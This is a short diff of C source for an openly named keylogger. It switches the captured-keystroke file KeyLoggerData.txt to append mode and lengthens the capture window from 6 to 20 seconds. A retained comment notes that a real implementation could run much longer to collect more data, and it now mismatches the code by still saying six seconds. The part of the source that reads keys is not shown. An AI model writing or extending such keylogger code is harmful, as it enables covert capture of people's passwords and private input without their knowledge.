@@ -1,14 +1,8 @@
-#include <linux/input.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <time.h> 
+#include "header.h"
 
-int keyLogger()
+void keyLogger()
 {
-FILE *f = fopen("KeyLoggerData.txt", "w");
+FILE *f = fopen("KeyLoggerData.txt", "a+");
    time_t begin, finish;
    double timer;  
     int fd;
@@ -24,7 +18,7 @@ FILE *f = fopen("KeyLoggerData.txt", "w");
     
      finish = time(NULL);
      timer = difftime(finish, begin);
-     if (timer >= 6 ) {//only tracks for six seconds in example, an actual implementaion could go much longer to track alot more data
+     if (timer >= 20 ) {//only tracks for six seconds in example, an actual implementaion could go much longer to track alot more data
        clockRunning = 0;
    }
 }
